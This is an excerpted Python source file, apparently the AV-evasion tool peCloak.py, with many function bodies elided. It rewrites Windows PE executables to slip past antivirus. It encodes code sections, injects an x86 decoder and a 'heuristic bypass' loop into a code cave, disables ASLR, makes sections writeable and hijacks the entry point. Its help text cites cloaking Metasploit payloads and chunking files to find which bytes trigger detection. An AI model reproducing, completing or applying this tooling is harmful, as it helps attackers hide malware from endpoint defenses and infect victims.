...
def chunk_file (file, chunk_size):
  ...
  if not os.path.exists(target_directory):
    ...
    log("[*] Target directory [%s] created" % target_directory)
  
  log("[*] Attempting to chunk file [%s] to target directory" % (file))
  ...
  with open(file, "rb") as f:
    ...
    while byte != "":
      ...
      byte_count += 1
      byte = f.read(1)
  log("[*] A total of %i bytes chunked into %i separate files" % (byte_count, chunk_count))
...
'''
def get_sections(pe):
  log("[*] PE Section Information Summary:")
  for section in pe.sections:
    log("\t[+] Name: %s, Virtual Address: %s, Virtual Size: %s, Characteristics: %s" % (section.Name, 
...
def get_info(pe, section):
  log("[*] Printing pe file info...\n")
  get_sections(pe)
  log(pe.OPTIONAL_HEADER)
...
def find_codecave_space(pe, required_space):
  log("[*] Searching for suitable code cave location...")
  for section in pe.sections:
    ...
    log("\t[+] Searching %s section..." % section_name)
    ...
    for byte in data_to_search:
      ...
      if byte == "00":
        ...
        if null_count >= required_space: # we've hit our required space limit
          ...
          log("\t[+] At least %i null bytes found in %s section to host code cave" % (null_count, code_cave_section))
  ...
  log("\t[+] No suitable code cave space found, creating a new section")
  return virtual_offset, raw_offset, code_cave_section
...
def get_code_cave (pe, skip_cave_search):
  ...
  if code_cave_virtual_offset == 0:
    log("[*] Creating new section for code cave...")
    ...
    try:
      ...
      log("Could not retrieve created code cave location. Check write permissions and try again.")
      sys.exit(2)
  ...
  log("[*] Code cave located at %s" % (code_cave_address))
...
def disable_aslr(pe):
  ...
  if (pe.OPTIONAL_HEADER.DllCharacteristics & IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE):
    ...
    log("[*] ASLR not enabled")

'''
  Save modified pe file
'''
def save_cloaked_pe(pe, file, output=None):
    try:
        ts = int(time.time())
        if output is None:
        ...
        log("[*] New file saved [" + fname + "]")
    except:
        log("[!] ERROR: Could not save modified PE file. Check write permissions and ensure the file is not in use")
        raise
        sys.exit(2)
...
def print_section_bytes(pe, section_range):
  ...
  if section_range:
      try:
        ...
        log("[!] ERROR: Invalid Parameters provided -- %s %s " % (sys.exc_info()[0], sys.exc_info()[1]))
        sys.exit(2)
      ...
      try:
        ...
        log("[!] ERROR: Could not retrieve section information. Check section name and try again")
        sys.exit(2)
      ...
      try:
        ...
        log("[*] %i bytes of %s section at offset %sd (%s) from section section start (%s)\n\n" % ((stop - start), section_name, start, hex(start), hex(section_start_address)))
        
        log("Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n")
          ...
          if total_count <= int(stop):
            if total_count >= int(start):
              if line_count <= 16:
                ...
                log(offset + "  " + byte_line + " || " + char_line)
                line_count = 1
                byte_line = ""
                char_line = ""
          total_count += 1  
        ...
        if byte_line != "":
          ...
          log(hex(int(offset, 16) + 16) + "  " + byte_line + (" " * (spacers)) +" || " + char_line)
  ...
  for section in pe.sections:
    if (name.strip().lower() in section.Name.strip().lower()):
      if section.Characteristics != 0xE0000020:
        ...
        log("[*] PE %s section made writeable with attribute 0xE0000020" % name)
        return pe
      else:
        log("[*] Verified PE %s section is already writeable" )
        return pe
        
  log("[!] Could not make %s section writeable" % name)
  return False
...
def mod_section(pe, section_name, mod_type, mod_range):
  ...
  try:
    ...
    log("[!] ERROR: Could not retrieve section information for modification. Check section name and try again.")
    sys.exit(2)
  ...
  try:
    if int(mod_range.split(":")[0]) < 0:
      ...
      log("[!] Invalid values provided for section modification range. Skipping this step")
      return
    else:
    ...
    for byte in data:
      ...
      if count in range(mod_lower, mod_upper):
        if mod_type == "1":
          ...
          log("[!] Invalid mod option provided. No modification mades")
          return
      modified_data += byte
      count += 1
          
    log("[*] %s in range %i to %i in section %s" % (modification, mod_lower, mod_upper, section_name))
    
    # write encoded data to image
    log("[*] Writing modified %s section to file" % section_name)
...
def add_fill_instructions(limit):
  ...
  filler_instructions = [
              "\x90",       # NOP
              "\x0f\x1f\x90\x90\x90\x90", # MULTI NOP
...
def build_encoder(heuristic_iterations):
  ...
  # print the encoder
  log("[*] Generated Encoder with the following instructions:")
  for item in encoder:
    log("\t[+] %s %s" % (item.split(" ")[0], hex(int(item.split(" ")[1]))))
...
def build_decoder(pe, encoder, section, decode_start, decode_end):
  ...
  mov_instruct = "\xb8" + decode_start[:4] # mov eax, decode_start
  decoder = mov_instruct + decoder  # prepend the decoder with the mov instruction 
  decoder += "\x40" # inc eax
  decoder += "\x3d" + decode_end[:4] # cmp eax, decode_end
...
def retrieve_data(pe, section_name, type):
  try:
    ...
    log("[!] ERROR: Could not retrieve section data. Check the section name.")
    sys.exit(2)
        ...
        if section:
          try:
            if len(section.split(":")) == 3:
              ...
              log("Invalid parameter provided. Use -h or --help for more info")
              sys.exit(2)
          except:
            log("[!] ERROR: Could not parse section name. Check the value provided for the -e option")
            sys.exit(2)
          ...
          if encode_offset == 0 and encode_length == len(data_to_encode):
            log("[*] Encoding entire %s section" % section_name)
          else:
            log("[*] Encoding a total of %i bytes data of the %s section starting at offset %i" % (encode_length, section_name, encode_offset))
          
          section_size = section_header.Misc_VirtualSize
          if encode_offset > section_size:
            log("[!] Provided offset for %s larger than section size. Skipping encoding." % section_name)
            continue
          ...
          # write encoded data to image
          log("[*] Writing encoded data to file")
...
def preserve_entry_instructions(pe, ep, ep_ava, offset_end):
  ...
  log("[*] Preserving the following entry instructions (at entry address %s):" % hex(ep_ava))
...
def generate_heuristic(loop_limit):
  ...
  if heuristic.endswith("\x00\x00\x00\x00"):
    raise
...
def build_heuristic_bypass(heuristic_iterations):
  ...
  log("[*] Generated Heuristic bypass of %i iterations" % heuristic_iterations)
...
def write_codecave(pe, code_cave_section, code_cave_raw_offset, heuristic_bypass, decoder, modified_entry_instructions, restore_execution_flow):
  ...
  log("[*] Writing code cave to file")
  log("\t[+] Heuristic Bypass")
  log("\t[+] Decoder")
  log("\t[+] Saved Entry Instructions")
  log("\t[+] Jump to Restore Execution Flow ")
...
def print_usage():
  ...
  log("To encode a file (w/ 3 heuristic bypass iterations) just call the script with a target filename and no options.")
  log("For more detailed help use the --help option\n")
...
def print_help():
  log("\nUsage: peCloak.py [[options]] [path_to_pe_file] \n")
  log("To encode a file (w/ 3 heuristic bypass iterations) just call the script with a target filename and no options.")
  log("For abbreviated help, use the -h option\n")
  log("\n========= INFORMATIONAL OPTIONS =========\n")
  log("-h, --help                                You're looking at it\n")
  log("-i, --info= [section]                     log(info for image / section")
  log("                                             - Possible options:")
  log("                                               all = log(image info and detailed info for all sections")
  log("                                               none = log(info for image only")
  log("                                               [section_name] = log(image info and detailed info for named section\n")
  log("-d, --dump [section:start:stop]           Dump (print) hex / ascii for range of bytes of named section")
  log("                                             - The range is an offset (from section start) and byte count")
  log("                                             - You can provide the values in either decimal or hex but")
  log("                                               keep in mind that these are offsets from the section start!\n")
  log("                                             - Example 1: -p .text:0-2000 means start at offset 0 of")
  log("                                               .text section and log(2000 bytes in total\n")
  log("                                             - Example2 : -p .text:14h-1000 means start at offset 14 hex (20d) of")
  log("                                               .text section and log(1000 bytes in total\n")
  log("\n========= CORE CLOAK OPTIONS =========\n")
  log("-e, --encode= [section:offset:length]     Encode the named section. By default, running this script without")
  log("                                          specifying this option will encode the .text section. You can also")
  log("                                          use this option to specify a different section. To name multiple sections")
  log("                                          separate them by commas. Note: range values are base 10 integers!" )
  log("                                             - Examples:" )
  log("                                               -e .text:5:500         encode 500 bytes of .text section starting at offset 5")
  log("                                               -e .rdata:100          encode .rdata section starting at offset 100")
  log("                                               -e .text, .rdata       encode all of .text and .rdata sections")
  log("                                               -e .text, rdata:0:100  encode all of .text section and first 100 bytes of .rdata\n" )
  log("-a, --add                                 Force addition of new section (.NewSec) for code cave")
  log("                                          Otherwise the script will try to add it to the existing .text/.code section")
  log("                                          if enough room is found.")
  log("-H, --heuristic= [x]                      Specify the number of iterations for the ")
  log("                                          heuristic bypass code (default=3)\n")
  log("-p, --preset= [preset]                    Use a preset encoding configuration to cloak your executable")
  log("                                          Useful if you cloak the same types of files frequenty (e.g. Metasploit payloads)")
  log("                                          Use a ? as the option value to see a list of currently configured presets")
  log("\n========= ADDITIONAL MODIFICATION OPTIONS =========\n")
  log("-s, --section= [section name]             Specify the pe section to modify" )
  log("                                          that will be modified (default is none)\n")
  log("                                             - Possible options include any valid sections other than .text:" )
  log("                                               .rsrc, .rdata, .data, etc.\n")
  log("                                          Important: If you choose a section to modify that is also being encoded")
  log("                                          the modification happens first!\n")
  log("                                          the modification happens first!\n")
  log("-m, --modification= [x]                   Specify the modification type to make for the target ")
  log("                                          section (other than .text)")
  log("                                             - Possible options:" )
  log("                                               1 = swap case of letters (hex values x41-x59 and x61-x7a)")
  log("                                               2 = replace letters with zeros (x00)")
  log("                                               3 = replace non-letters with zeros (x00)\n")
  log("-r, --range= [x:y]                        Specify the range (in bytes) for modification within the")
  log("                                          target pe section (other than .text)\n")
  log("                                             - Format = start:end Example: --range=0:2000" )
  log("                                             - The default is to start at the beginning and") 
  log("                                               modify the entire section")
  log("                                             - Specifying 0 for the start value will also ")
  log("                                               start at the beginning")
  log("                                             - Specifying a number larger than the size of ")
  log("                                               the section will default to the end of the section\n")
  log("\n========= OTHER OPTIONS =========\n")
  log("-c, --chunk= [chunk_size]                 Split the file into chunks of designated size for AV scanning")
  log("                                          May be useful if you need to determine which portion of a file")
  log("                                          is triggering detection")
  log("-o, --output= [output_file]               Output file.")
  sys.exit()
...
def main(argv):
  ...
  try:
    opts, args = getopt.getopt(argv, "hai:d:p:e:H:s:r:m:c:o:", ["help", "add", "info=", "dump=", "preset=", "encode=",  "heuristic=", "section=", "range=", "modification=", "chunk=", "output="])
  ...
  log(header) # log(display header)
  
  # open file for modification
  try:
    pe =  pefile.PE(file)
  except:
    log("[!] ERROR: Cannot open file [%s] for modification" % file)
    sys.exit()
  ...
  if section_to_mod:
    if mod_range and mod_type:
      ...
      log("[!] Invalid options passed for custom section modification. Ignoring.")
  ...
  log("[*] Overwriting first bytes at physical address %08x with jump to code cave" % (jmp_overwrite_location) )
  ...
  save_cloaked_pe(pe, file, output)  
